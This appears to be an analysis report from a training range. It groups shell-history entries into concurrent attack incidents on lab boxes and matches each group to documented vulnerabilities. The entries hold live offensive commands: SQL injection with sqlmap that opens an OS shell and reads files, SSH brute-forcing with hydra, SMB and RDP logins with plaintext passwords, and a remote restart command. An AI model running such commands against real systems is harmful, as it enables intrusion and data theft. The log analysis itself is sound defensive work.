# Filtered Concurrent Incidents (different teams + documented vuln)

## Incident 1 - 2026-01-27T19:01:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:01:55 | logs/10.100.7.34/shell_history.csv#L64 | nxc smb http://10.100.7.46/ u-username p-password
  - 2026-01-27T19:01:01 | logs/10.100.7.14/shell_history.csv#L309 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:13 | logs/10.100.7.14/shell_history.csv#L310 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:33 | logs/10.100.7.14/shell_history.csv#L311 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:46 | logs/10.100.7.14/shell_history.csv#L312 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:50 | logs/10.100.7.14/shell_history.csv#L313 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:01:55 | logs/10.100.7.14/shell_history.csv#L314 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:01:31 | logs/10.100.7.22/shell_history.csv#L182 | nxc smb 10.100.7.46 -u [user] -p [password]
  - 2026-01-27T19:01:10 | logs/10.100.7.24/shell_history.csv#L254 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:01:20 | logs/10.100.7.24/shell_history.csv#L255 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:01:43 | logs/10.100.7.24/shell_history.csv#L256 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:01:52 | logs/10.100.7.24/shell_history.csv#L257 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 2 - 2026-01-27T19:05:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T19:05:43 | logs/10.100.7.14/shell_history.csv#L320 | gobuster dir -u http://10.100.7.45 -w /usr/share/dirb/wordlists/common.txt
  - 2026-01-27T19:05:12 | logs/10.100.7.22/shell_history.csv#L191 | nxc smb 10.100.7.45 -u guest -p "
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 3 - 2026-01-27T19:09:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:09:24 | logs/10.100.7.14/shell_history.csv#L321 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:09:58 | logs/10.100.7.14/shell_history.csv#L322 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:09:47 | logs/10.100.7.24/shell_history.csv#L268 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 4 - 2026-01-27T19:10:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:10:08 | logs/10.100.7.14/shell_history.csv#L323 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:10:17 | logs/10.100.7.14/shell_history.csv#L324 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:10:05 | logs/10.100.7.24/shell_history.csv#L269 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T19:10:14 | logs/10.100.7.24/shell_history.csv#L270 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 5 - 2026-01-27T19:11:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:11:40 | logs/10.100.7.32/shell_history.csv#L646 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:11:01 | logs/10.100.7.14/shell_history.csv#L325 | nmap 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 6 - 2026-01-27T19:18:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:18:01 | logs/10.100.7.32/shell_history.csv#L654 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:18:04 | logs/10.100.7.32/shell_history.csv#L655 | nxc smb 10.100.7.46 -u rand2 -p 'f?D07VdW6S$)' --shares
  - 2026-01-27T19:18:27 | logs/10.100.7.14/shell_history.csv#L334 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T19:18:44 | logs/10.100.7.14/shell_history.csv#L335 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 7 - 2026-01-27T19:19:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:19:42 | logs/10.100.7.33/shell_history.csv#L114 | nxc smb 10.100.7.46 -p '' --shares
  - 2026-01-27T19:19:22 | logs/10.100.7.14/shell_history.csv#L336 | nmap 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 8 - 2026-01-27T19:23:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:23:42 | logs/10.100.7.21/shell_history.csv#L95 | netexec smb 10.100.7.46
  - 2026-01-27T19:23:04 | logs/10.100.7.33/shell_history.csv#L120 | nxc smb 10.100.7.46 -u guest -p " --shares
  - 2026-01-27T19:23:04 | logs/10.100.7.33/shell_history.csv#L121 | nxc smb 10.100.7.46 -u guest -p " --shares
  - 2026-01-27T19:23:51 | logs/10.100.7.33/shell_history.csv#L122 | smbclient //10.100.7.46/Scripts --guest
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 9 - 2026-01-27T19:35:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:35:40 | logs/10.100.7.32/shell_history.csv#L689 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:35:19 | logs/10.100.7.14/shell_history.csv#L357 | dirbuster -u 10.100.7.46 -e
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 10 - 2026-01-13T19:19:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:19:36 | logs/10.100.7.13/shell_history.csv#L49 | evil-winrm -i 10.100.7.42 -u root
  - 2026-01-13T19:19:19 | logs/10.100.7.24/shell_history.csv#L49 | nxc smb 10.100.7.42 -u orbital -p securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 11 - 2026-01-13T19:54:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:54:11 | logs/10.100.7.11/shell_history.csv#L73 | evil-winrm -i 10.100.7.42 -u orbital
  - 2026-01-13T19:54:55 | logs/10.100.7.11/shell_history.csv#L74 | evil-winrm -i 10.100.7.42 -u orbital
  - 2026-01-13T19:54:38 | logs/10.100.7.32/shell_history.csv#L321 | smbclient //10.100.7.42/public --user guest
  - 2026-01-13T19:54:53 | logs/10.100.7.32/shell_history.csv#L322 | smbclient //10.100.7.42/public --user guest
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 12 - 2026-01-13T19:56:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:56:00 | logs/10.100.7.11/shell_history.csv#L77 | evil-winrm -i 10.100.7.42 -u orbital
  - 2026-01-13T19:56:49 | logs/10.100.7.32/shell_history.csv#L326 | nxc smb 10.100.7.42 -u guest -p '' --shares
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 13 - 2026-01-13T19:58:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:58:28 | logs/10.100.7.32/shell_history.csv#L330 | nxc smb 10.100.7.42 -u guest -p ''
  - 2026-01-13T19:58:59 | logs/10.100.7.32/shell_history.csv#L331 | nxc smb 10.100.7.42 -u solaris -p solar-paneL321
  - 2026-01-13T19:58:53 | logs/10.100.7.24/shell_history.csv#L67 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-13T19:58:57 | logs/10.100.7.24/shell_history.csv#L68 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 14 - 2026-01-13T19:59:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:59:40 | logs/10.100.7.11/shell_history.csv#L79 | evil-winrm -i 10.100.7.42 -u root
  - 2026-01-13T19:59:53 | logs/10.100.7.32/shell_history.csv#L332 | nxc smb 10.100.7.42 -u solaris -p solar-paneL321
  - 2026-01-13T19:59:00 | logs/10.100.7.24/shell_history.csv#L69 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-13T19:59:10 | logs/10.100.7.24/shell_history.csv#L70 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 15 - 2026-01-13T20:01:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:01:40 | logs/10.100.7.11/shell_history.csv#L81 | evil-winrm -i 10.100.7.42
  - 2026-01-13T20:01:57 | logs/10.100.7.32/shell_history.csv#L342 | nxc smb 10.100.7.42 -u guest -X echo""
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 16 - 2026-01-26T18:45:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-26T18:45:14 | logs/10.100.7.11/shell_history.csv#L144 | evil-winrm -i 10.100.7.42 -u solaris
  - 2026-01-26T18:45:14 | logs/10.100.7.24/shell_history.csv#L100 | xfreerdp3 /u:orbital /v:10.100.7.42
  - 2026-01-26T18:45:27 | logs/10.100.7.24/shell_history.csv#L101 | xfreerdp3 /u:orbital /v:10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 17 - 2026-01-26T19:23:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:23:54 | logs/10.100.7.11/shell_history.csv#L166 | gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/big.txt
  - 2026-01-26T19:23:58 | logs/10.100.7.24/shell_history.csv#L148 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
  - 2026-01-26T19:23:21 | logs/10.100.7.31/shell_history.csv#L11 | nmap 10.100.7.46 -p 445
  - 2026-01-26T19:23:52 | logs/10.100.7.31/shell_history.csv#L13 | nxc smb 10.100.7.46
  - 2026-01-26T19:23:58 | logs/10.100.7.31/shell_history.csv#L14 | nxc smb 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 18 - 2026-01-26T19:37:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:37:37 | logs/10.100.7.11/shell_history.csv#L170 | gobuster dir -u 10.100.7.46 -w /usr/share/wordlists/dirb/eureka.txt
  - 2026-01-26T19:37:08 | logs/10.100.7.24/shell_history.csv#L185 | smbclient //10.100.7.46/Scripts -c put maintenance.ps1 maintenance.ps1""
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 19 - 2026-01-27T18:52:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:52:15 | logs/10.100.7.32/shell_history.csv#L630 | nxc smb 10.100.7.46 -u guest -p '' --users
  - 2026-01-27T18:52:20 | logs/10.100.7.32/shell_history.csv#L631 | nxc smb 10.100.7.46 -u guest -p '' --shares
  - 2026-01-27T18:52:50 | logs/10.100.7.22/shell_history.csv#L174 | nxc smb 10.100.7.46
  - 2026-01-27T18:52:37 | logs/10.100.7.24/shell_history.csv#L233 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-27T18:52:43 | logs/10.100.7.24/shell_history.csv#L234 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 20 - 2026-01-27T18:53:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:53:27 | logs/10.100.7.14/shell_history.csv#L294 | nmap 10.100.7.46
  - 2026-01-27T18:53:42 | logs/10.100.7.22/shell_history.csv#L175 | smbclient -L //10.100.7.46
  - 2026-01-27T18:53:40 | logs/10.100.7.24/shell_history.csv#L235 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 21 - 2026-01-27T19:03:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:03:16 | logs/10.100.7.11/shell_history.csv#L185 | nxc smb 10.100.7.46 -u EMBER$ -p J4f9juEr --shares
  - 2026-01-27T19:03:50 | logs/10.100.7.32/shell_history.csv#L636 | nxc smb 10.100.7.46 -u EMBER -p 'h3ab9pR32xd5A84VAGLS' --shares
  - 2026-01-27T19:03:49 | logs/10.100.7.14/shell_history.csv#L319 | gobuster dir -u http://10.100.7.46 -w /usr/share/dirb/wordlists/common.txt
  - 2026-01-27T19:03:12 | logs/10.100.7.22/shell_history.csv#L184 | nxc smb 10.100.7.46 -u guest -p
  - 2026-01-27T19:03:32 | logs/10.100.7.22/shell_history.csv#L185 | nxc smb 10.100.7.46 -u ember -p
  - 2026-01-27T19:03:50 | logs/10.100.7.22/shell_history.csv#L186 | nxc smb 10.100.7.46 -u ember -p "
  - 2026-01-27T19:03:10 | logs/10.100.7.24/shell_history.csv#L264 | xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-27T19:03:16 | logs/10.100.7.24/shell_history.csv#L265 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 22 - 2026-01-27T19:04:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:04:28 | logs/10.100.7.34/shell_history.csv#L66 | nxc smb 10.100.7.46 -u username -p password
  - 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L67 | nxc smb 10.100.7.46 -u username -p password
  - 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L68 | nxc smb 10.100.7.46 -u username -p password
  - 2026-01-27T19:04:41 | logs/10.100.7.34/shell_history.csv#L69 | nxc smb 10.100.7.46 -u username -p password
  - 2026-01-27T19:04:03 | logs/10.100.7.32/shell_history.csv#L637 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:04:02 | logs/10.100.7.22/shell_history.csv#L187 | nxc smb 10.100.7.46 -u guest -p "
  - 2026-01-27T19:04:21 | logs/10.100.7.22/shell_history.csv#L188 | ssh guest@10.100.7.46
  - 2026-01-27T19:04:26 | logs/10.100.7.22/shell_history.csv#L189 | ssh guest@10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 23 - 2026-01-27T19:17:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:17:05 | logs/10.100.7.11/shell_history.csv#L198 | ssh rand2@10.100.7.46
  - 2026-01-27T19:17:55 | logs/10.100.7.33/shell_history.csv#L113 | nxc smb 10.100.7.46 -p ''
  - 2026-01-27T19:17:35 | logs/10.100.7.14/shell_history.csv#L332 | evil-winrm -i 10.100.7.46 -u rand -p dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 24 - 2026-02-02T19:42:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:42:00 | logs/10.100.7.32/shell_history.csv#L838 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"
  - 2026-02-02T19:42:18 | logs/10.100.7.32/shell_history.csv#L847 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"
  - 2026-02-02T19:42:26 | logs/10.100.7.32/shell_history.csv#L848 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"
  - 2026-02-02T19:42:37 | logs/10.100.7.13/shell_history.csv#L304 | curl http://10.100.7.45/panels.php?id=5 ORDER BY 1 -- -""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 25 - 2026-02-03T18:51:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:51:08 | logs/10.100.7.32/shell_history.csv#L902 | sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/home/pyre/ctrl.txt"
  - 2026-02-03T18:51:43 | logs/10.100.7.12/shell_history.csv#L221 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 26 - 2026-02-03T18:56:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T18:56:02 | logs/10.100.7.32/shell_history.csv#L910 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../../opt""
  - 2026-02-03T18:56:19 | logs/10.100.7.32/shell_history.csv#L911 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="cat ./index.php""
  - 2026-02-03T18:56:41 | logs/10.100.7.32/shell_history.csv#L912 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="cat ./alerts.php""
  - 2026-02-03T18:56:59 | logs/10.100.7.12/shell_history.csv#L227 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="ls""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 27 - 2026-02-03T19:05:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:05:59 | logs/10.100.7.12/shell_history.csv#L230 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:05:17 | logs/10.100.7.31/shell_history.csv#L29 | hydra -t 4 -V -f -l pyre -P rockyou.txt.gz ssh://10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 28 - 2026-02-03T19:28:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-03T19:28:45 | logs/10.100.7.32/shell_history.csv#L938 | sqlmap -u http://10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:28:21 | logs/10.100.7.12/shell_history.csv#L249 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-03T19:28:25 | logs/10.100.7.12/shell_history.csv#L250 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 29 - 2026-02-10T19:21:00
- Target IP: 10.100.7.48
- Target Box: inspire
- Entries:
  - 2026-02-10T19:21:17 | logs/10.100.7.34/shell_history.csv#L79 | nmap -sC -sV -p 22,80 10.100.7.48
  - 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L80 | nmap -sC -sV -p 22,80 10.100.7.48
  - 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L81 | nmap -sC -sV -p 22,80 10.100.7.48
  - 2026-02-10T19:21:35 | logs/10.100.7.34/shell_history.csv#L82 | nmap -sC -sV -p 22,80 10.100.7.48
  - 2026-02-10T19:21:58 | logs/10.100.7.34/shell_history.csv#L83 | gobuster dir -u http://10.100.7.48/ -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-10T19:21:49 | logs/10.100.7.14/shell_history.csv#L564 | mysql -h 10.100.7.48 -P 3306 -u inspire
- Matched Vulnerability Notes:
  - boxes/inspire/documentation.md: sql, git, anonymous, base64, pickle
  - boxes/inspire/deploy/deploy.sh: sql, anonymous, pickle

## Incident 30 - 2026-02-10T19:56:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T19:56:27 | logs/10.100.7.34/shell_history.csv#L113 | enum4linux -a 10.100.7.42
  - 2026-02-10T19:56:40 | logs/10.100.7.34/shell_history.csv#L114 | nmap --script smb-enum-shares,smb-enum-users -p445 10.100.7.42
  - 2026-02-10T19:56:13 | logs/10.100.7.14/shell_history.csv#L611 | sqlcmd -S tcp:10.100.7.42,1433
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 31 - 2026-02-10T20:10:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-10T20:10:47 | logs/10.100.7.11/shell_history.csv#L356 | nxc smb 10.100.7.42 -u orbital -p 'Canopy@123'
  - 2026-02-10T20:10:46 | logs/10.100.7.31/shell_history.csv#L96 | nxc smb 10.100.7.42 -u orbital -p 123 -X Restart-Computer
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 32 - 2026-02-09T18:52:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T18:52:52 | logs/10.100.7.33/shell_history.csv#L161 | ssh orbital@10.100.7.42
  - 2026-02-09T18:52:58 | logs/10.100.7.33/shell_history.csv#L162 | ssh orbital@10.100.7.42
  - 2026-02-09T18:52:59 | logs/10.100.7.33/shell_history.csv#L163 | ssh orbital@10.100.7.42
  - 2026-02-09T18:52:25 | logs/10.100.7.14/shell_history.csv#L478 | smbmap -H 10.100.7.42 -u guest -p "
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 33 - 2026-02-09T19:37:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-02-09T19:37:16 | logs/10.100.7.33/shell_history.csv#L170 | evil-winrm -i 10.100.7.42 -u orbital -p securepassword
  - 2026-02-09T19:37:21 | logs/10.100.7.14/shell_history.csv#L511 | xfreerdp3 /v:10.100.7.42 /u:orbital /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 34 - 2026-01-12T19:54:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:54:39 | logs/10.100.7.34/shell_history.csv#L13 | nmap 10.100.7.41 10.100.7.42 10.100.7.43
  - 2026-01-12T19:54:57 | logs/10.100.7.13/shell_history.csv#L34 | hydra -l guest -P /usr/share/wordlists/rockyou.txt ssh://10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 35 - 2026-01-13T19:49:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T19:49:30 | logs/10.100.7.32/shell_history.csv#L314 | nxc smb 10.100.7.42 -u guest -p '' --shares
  - 2026-01-13T19:49:45 | logs/10.100.7.24/shell_history.csv#L62 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 36 - 2026-01-13T20:14:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-13T20:14:46 | logs/10.100.7.32/shell_history.csv#L353 | nxc smb 10.100.7.42 -u orbital -p orbital""
  - 2026-01-13T20:14:38 | logs/10.100.7.24/shell_history.csv#L81 | enum4linux -a 10.100.7.42
  - 2026-01-13T20:14:39 | logs/10.100.7.24/shell_history.csv#L82 | enum4linux -a 10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 37 - 2026-01-27T18:59:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T18:59:46 | logs/10.100.7.34/shell_history.csv#L63 | nxc smb http://10.100.7.46/ u-username p-password
  - 2026-01-27T18:59:06 | logs/10.100.7.14/shell_history.csv#L304 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:59:16 | logs/10.100.7.14/shell_history.csv#L305 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:59:25 | logs/10.100.7.14/shell_history.csv#L306 | xfreerdp3 /v:10.100.7.46 /u:rand /p:dFMVxYA4!
  - 2026-01-27T18:59:11 | logs/10.100.7.24/shell_history.csv#L249 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:59:22 | logs/10.100.7.24/shell_history.csv#L250 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
  - 2026-01-27T18:59:44 | logs/10.100.7.24/shell_history.csv#L251 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4!
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 38 - 2026-01-27T19:02:00
